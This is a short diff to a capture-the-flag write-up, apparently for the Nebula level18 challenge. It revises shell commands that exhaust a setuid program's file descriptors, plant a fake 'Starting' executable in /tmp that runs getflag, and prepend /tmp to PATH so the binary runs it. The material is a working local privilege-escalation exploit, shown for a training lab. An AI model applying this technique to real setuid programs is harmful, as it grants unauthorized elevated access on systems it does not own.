@@ -312,13 +312,12 @@ Method 1:
 ulimit -a 
 [. . .]
 open files                      (-n) 1024
-$ for i in {0..1030}; do echo "login test" >> input; done
+$ for i in {0..1030}; do echo "login test" >> /tmp/input; done
 $ echo "closelog" >> /tmp/input
-$ echo "shell" >> input
+$ echo "shell" >> /tmp/input
 $ echo "/bin/getflag" > /tmp/Starting
 $ chmod +x /tmp/Starting
-$ export PATH=/tmp:$PATH
-$ cat input |/home/flag18/flag18 -d deglog
+$ PATH=/tmp:$PATH cat /tmp/input |/home/flag18/flag18 --init-file -d /tmp/debuglog
 
 Method 2:
 level18.c: In function ânotsupportedâ:
